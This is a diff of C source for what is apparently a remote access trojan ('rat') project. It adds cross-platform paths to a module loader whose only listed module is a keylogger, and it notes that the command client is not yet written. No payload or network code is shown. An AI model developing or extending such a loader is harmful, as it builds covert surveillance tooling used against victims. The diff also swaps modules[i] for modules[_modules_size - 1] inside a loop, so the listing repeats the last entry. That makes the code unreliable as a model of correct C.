@@ -1,12 +1,4 @@
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-#include <dlfcn.h>
-
-#include "mod.c"
-#include "debug.c"
-
-#define COMMAND_SIZE 256
+#include "rat.h"
 
 void
 list_modules(void) {
@@ -16,7 +8,7 @@ list_modules(void) {
 	write(1, "\n", 1);
 
 	for (i = 0; i < _modules_size; ++i) {
-		mod = modules[i];
+		mod = modules[_modules_size - 1];
 
 		write(1, "\t", 1);
 		write(1, mod->name, strlen(mod->name));
@@ -35,7 +27,14 @@ load_all_modules(char *mods[], char *mod_path) {
 }
 
 int main(void) {
+
+#ifdef linux
 	char *mod_path = "/home/venus/projects/rat/modules/";
+#endif
+#ifdef _WIN32
+
+	char *mod_path = "C:\\Users\\User";
+#endif
 	char *mods[] = {
 		"keylogger",
 		NULL
@@ -46,9 +45,12 @@ int main(void) {
 	clean_modules();
 	/*
 	* Debug code until we write the client
+
 	char command[COMMAND_SIZE];
+
 	while (1) {
 	fgets( command, COMMAND_SIZE, stdin );
+
 	}
 	*/
 
